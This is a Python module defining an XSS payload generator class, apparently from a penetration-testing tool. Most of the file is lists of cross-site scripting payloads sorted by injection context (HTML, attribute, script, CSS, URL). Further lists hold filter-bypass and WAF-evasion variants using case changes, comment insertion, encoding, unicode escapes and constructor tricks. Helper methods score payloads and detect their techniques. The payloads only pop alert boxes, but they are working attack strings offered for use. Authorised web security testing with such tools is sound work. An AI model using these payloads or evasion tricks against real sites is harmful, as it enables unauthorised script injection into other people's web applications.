"""
XSS payload generator module
Generates Cross-Site Scripting payloads with context awareness and bypass techniques
"""

import json
import random
import re
from typing import List, Dict, Any
from pathlib import Path


class XSSGenerator:
    """Generates XSS payloads with advanced evasion techniques"""
    
    def __init__(self):
        """Initialize XSS generator with payload database"""
        self.payload_database = []
        self._initialize_default_payloads()
    
    def _initialize_default_payloads(self):
        """Initialize with default XSS payloads"""
        self.payload_database = [
            # Basic XSS payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            
            # JavaScript event handlers
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            
            # Advanced payloads
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            "<img src=x onerror=\"alert`1`\">",
            "<svg><script>alert&#40;1&#41;</script></svg>",
            "<iframe srcdoc=\"<script>alert(1)</script>\">",
            "<object data=\"javascript:alert(1)\">",
            
            # Filter bypass techniques
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script>ale/**/rt(1)</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<svg onload=\"alert(1)\">",
            
            # WAF evasion
            "<script>window['alert'](1)</script>",
            "<script>this['alert'](1)</script>",
            "<script>[].constructor.constructor('alert(1)')()</script>",
            "<img src onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            
            # DOM-based XSS
            "<script>document.write('<img src=x onerror=alert(1)>')</script>",
            "<script>document.location='javascript:alert(1)'</script>",
            "<script>eval(location.hash.slice(1))</script>",
            
            # Context-specific payloads
            "javascript:alert(1)",
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "</script><script>alert(1)</script>",
            "';alert(1);//",
            "\";alert(1);//"
        ]
    
    def load_payload_database(self, file_path: str):
        """Load payloads from JSON file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if isinstance(data, list):
                    self.payload_database.extend(data)
                elif isinstance(data, dict) and 'xss_payloads' in data:
                    self.payload_database.extend(data['xss_payloads'])
        except Exception as e:
            print(f"Warning: Could not load XSS payload database: {e}")
    
    def generate_payloads(self, count: int = 5, context: str = 'html',
                         filter_bypass: bool = False, waf_evasion: bool = False) -> List[str]:
        """
        Generate XSS payloads based on context and evasion requirements
        
        Args:
            count: Number of payloads to generate
            context: XSS context (html, attribute, script, css, url)
            filter_bypass: Include filter bypass techniques
            waf_evasion: Include WAF evasion techniques
            
        Returns:
            List of XSS payloads
        """
        payloads = []
        
        # Context-specific payload generation
        if context == 'html':
            payloads.extend(self._generate_html_context_payloads(count))
        elif context == 'attribute':
            payloads.extend(self._generate_attribute_context_payloads(count))
        elif context == 'script':
            payloads.extend(self._generate_script_context_payloads(count))
        elif context == 'css':
            payloads.extend(self._generate_css_context_payloads(count))
        elif context == 'url':
            payloads.extend(self._generate_url_context_payloads(count))
        else:
            # Default to mixed payloads
            payloads.extend(random.sample(self.payload_database, 
                                        min(count, len(self.payload_database))))
        
        # Apply filter bypass techniques
        if filter_bypass:
            payloads.extend(self._generate_filter_bypass_payloads(count // 2))
        
        # Apply WAF evasion techniques
        if waf_evasion:
            payloads.extend(self._generate_waf_evasion_payloads(count // 2))
        
        # Remove duplicates and limit count
        unique_payloads = list(set(payloads))
        return unique_payloads[:count]
    
    def _generate_html_context_payloads(self, count: int) -> List[str]:
        """Generate payloads for HTML context"""
        html_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>"
        ]
        
        return random.sample(html_payloads, min(count, len(html_payloads)))
    
    def _generate_attribute_context_payloads(self, count: int) -> List[str]:
        """Generate payloads for HTML attribute context"""
        attribute_payloads = [
            "' onmouseover='alert(\"XSS\")'",
            "\" onmouseover=\"alert('XSS')\"",
            "' onfocus='alert(\"XSS\")' autofocus='",
            "\" onfocus=\"alert('XSS')\" autofocus=\"",
            "' onclick='alert(\"XSS\")'",
            "\" onclick=\"alert('XSS')\"",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "' onerror='alert(\"XSS\")' src='x",
            "\" onerror=\"alert('XSS')\" src=\"x",
            "' onload='alert(\"XSS\")'",
            "\" onload=\"alert('XSS')\"",
            "'%20onmouseover='alert(\"XSS\")'",
            "\"%20onmouseover=\"alert('XSS')\"",
            "javascript:alert('XSS')"
        ]
        
        return random.sample(attribute_payloads, min(count, len(attribute_payloads)))
    
    def _generate_script_context_payloads(self, count: int) -> List[str]:
        """Generate payloads for JavaScript context"""
        script_payloads = [
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "'-alert('XSS')-'",
            "\"-alert('XSS')-\"",
            "';alert(String.fromCharCode(88,83,83));//",
            "\"+alert('XSS')+\"",
            "'-alert('XSS')-'",
            "';eval('alert(\"XSS\")');//",
            "\";eval('alert(\"XSS\")');//",
            "';window['alert']('XSS');//",
            "\";window['alert']('XSS');//",
            "'-prompt('XSS')-'",
            "\"-prompt('XSS')-\"",
            "';confirm('XSS');//",
            "\";confirm('XSS');//"
        ]
        
        return random.sample(script_payloads, min(count, len(script_payloads)))
    
    def _generate_css_context_payloads(self, count: int) -> List[str]:
        """Generate payloads for CSS context"""
        css_payloads = [
            "expression(alert('XSS'))",
            "url(javascript:alert('XSS'))",
            "url('javascript:alert(\"XSS\")')",
            "url(\"javascript:alert('XSS')\")",
            "@import 'javascript:alert(\"XSS\")'",
            "behavior:url(xss.htc)",
            "x:expression(alert('XSS'))",
            "background:url(javascript:alert('XSS'))",
            "list-style-image:url(javascript:alert('XSS'))",
            "binding:url(xss.xml#xss)"
        ]
        
        return random.sample(css_payloads, min(count, len(css_payloads)))
    
    def _generate_url_context_payloads(self, count: int) -> List[str]:
        """Generate payloads for URL context"""
        url_payloads = [
            "javascript:alert('XSS')",
            "javascript:alert(String.fromCharCode(88,83,83))",
            "javascript:eval('alert(\"XSS\")')",
            "javascript:window.alert('XSS')",
            "javascript:this.alert('XSS')",
            "javascript:[].constructor.constructor('alert(\"XSS\")')();",
            "javascript:setTimeout('alert(\"XSS\")',0)",
            "javascript:setInterval('alert(\"XSS\")',0)",
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
        ]
        
        return random.sample(url_payloads, min(count, len(url_payloads)))
    
    def _generate_filter_bypass_payloads(self, count: int) -> List[str]:
        """Generate payloads with filter bypass techniques"""
        bypass_payloads = [
            # Case variation
            "<ScRiPt>alert(1)</ScRiPt>",
            "<sCrIpT>alert(1)</sCrIpT>",
            "<SCRIPT>alert(1)</SCRIPT>",
            
            # Comment insertion
            "<script>ale/**/rt(1)</script>",
            "<script>al/**/ert(1)</script>",
            "<img src=x one/**/rror=alert(1)>",
            
            # Null byte tricks
            "<script>alert(1)</script>%00",
            "<img src=x onerror=alert(1)>%00",
            
            # Character encoding
            "<script>alert(String.fromCharCode(49))</script>",
            "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
            
            # Whitespace variations
            "<script>alert\n(1)</script>",
            "<script>alert\t(1)</script>",
            "<script>alert\r(1)</script>",
            
            # Tag variations
            "<script\n>alert(1)</script>",
            "<img\nsrc=x\nonerror=alert(1)>",
            "<svg\nonload=alert(1)>"
        ]
        
        return random.sample(bypass_payloads, min(count, len(bypass_payloads)))
    
    def _generate_waf_evasion_payloads(self, count: int) -> List[str]:
        """Generate payloads with WAF evasion techniques"""
        waf_evasion_payloads = [
            # Alternative syntax
            "<script>window['alert'](1)</script>",
            "<script>this['alert'](1)</script>",
            "<script>globalThis['alert'](1)</script>",
            
            # Constructor techniques
            "<script>[].constructor.constructor('alert(1)')()</script>",
            "<script>''['constructor']['constructor']('alert(1)')()</script>",
            
            # Template literals
            "<script>alert`1`</script>",
            "<script>eval`alert(1)`</script>",
            
            # Alternative events
            "<img src onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<details/open/ontoggle=alert(1)>",
            
            # Unicode evasion
            "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>",
            "<script>eval('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029')</script>",
            
            # HTML entities
            "<script>alert&#40;1&#41;</script>",
            "<script>alert&#x28;1&#x29;</script>",
            
            # Alternative quotes
            "<script>alert('XSS')</script>",
            '<script>alert("XSS")</script>',
            "<script>alert(`XSS`)</script>"
        ]
        
        return random.sample(waf_evasion_payloads, min(count, len(waf_evasion_payloads)))
    
    def validate_payload(self, payload: str) -> Dict[str, Any]:
        """
        Validate XSS payload for basic syntax and structure
        
        Args:
            payload: XSS payload to validate
            
        Returns:
            Validation result dictionary
        """
        result = {
            'valid': True,
            'errors': [],
            'warnings': [],
            'score': 0
        }
        
        # Basic validation checks
        if not payload.strip():
            result['valid'] = False
            result['errors'].append("Empty payload")
            return result
        
        # Check for basic XSS patterns
        xss_patterns = [
            r'<script.*?>.*?</script>',
            r'javascript:',
            r'on\w+\s*=',
            r'<\w+.*?onerror.*?>',
            r'<\w+.*?onload.*?>',
            r'alert\s*\(',
            r'eval\s*\(',
            r'prompt\s*\(',
            r'confirm\s*\('
        ]
        
        pattern_matches = 0
        for pattern in xss_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                pattern_matches += 1
        
        # Score based on pattern matches
        result['score'] = min(pattern_matches * 20, 100)
        
        # Check for common issues
        if '<' not in payload and 'javascript:' not in payload:
            result['warnings'].append("No HTML tags or JavaScript protocol detected")
        
        if payload.count('<') != payload.count('>'):
            result['warnings'].append("Unmatched HTML tags")
        
        # Check for potential encoding issues
        if '\\x' in payload or '\\u' in payload:
            result['warnings'].append("Contains encoded characters")
        
        return result
    
    def get_payload_info(self, payload: str) -> Dict[str, Any]:
        """
        Get detailed information about an XSS payload
        
        Args:
            payload: XSS payload to analyze
            
        Returns:
            Dictionary with payload information
        """
        info = {
            'type': 'XSS',
            'length': len(payload),
            'context': self._detect_context(payload),
            'techniques': self._detect_techniques(payload),
            'risk_level': self._assess_risk_level(payload)
        }
        
        return info
    
    def _detect_context(self, payload: str) -> str:
        """Detect the likely context for the XSS payload"""
        if payload.startswith('javascript:'):
            return 'url'
        elif any(attr in payload.lower() for attr in ["'", '"', 'on']):
            return 'attribute'
        elif 'expression(' in payload.lower() or 'url(' in payload.lower():
            return 'css'
        elif any(op in payload for op in ["';", '";', "'+", '"+', "'-", '"-']):
            return 'script'
        else:
            return 'html'
    
    def _detect_techniques(self, payload: str) -> List[str]:
        """Detect techniques used in the payload"""
        techniques = []
        
        if re.search(r'[A-Z][a-z][A-Z]', payload):
            techniques.append('case_variation')
        
        if '/**/' in payload or '<!--' in payload:
            techniques.append('comment_insertion')
        
        if re.search(r'String\.fromCharCode|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}', payload, re.IGNORECASE):
            techniques.append('encoding')
        
        if re.search(r'window\[|this\[|\[\]\.constructor', payload):
            techniques.append('property_access')
        
        if '`' in payload:
            techniques.append('template_literals')
        
        if re.search(r'&#\d+;|&#x[0-9a-f]+;', payload):
            techniques.append('html_entities')
        
        return techniques
    
    def _assess_risk_level(self, payload: str) -> str:
        """Assess the risk level of the payload"""
        risk_indicators = 0
        
        # Check for dangerous functions
        dangerous_functions = ['eval', 'setTimeout', 'setInterval', 'Function']
        for func in dangerous_functions:
            if func in payload:
                risk_indicators += 2
        
        # Check for data exfiltration
        if any(keyword in payload.lower() for keyword in ['document.', 'location.', 'fetch(', 'xhr']):
            risk_indicators += 3
        
        # Check for DOM manipulation
        if any(keyword in payload.lower() for keyword in ['innerhtml', 'write(', 'writeln(']):
            risk_indicators += 2
        
        # Check for basic alert/prompt
        if any(keyword in payload.lower() for keyword in ['alert(', 'prompt(', 'confirm(']):
            risk_indicators += 1
        
        if risk_indicators >= 5:
            return 'high'
        elif risk_indicators >= 2:
            return 'medium'
        else:
            return 'low'
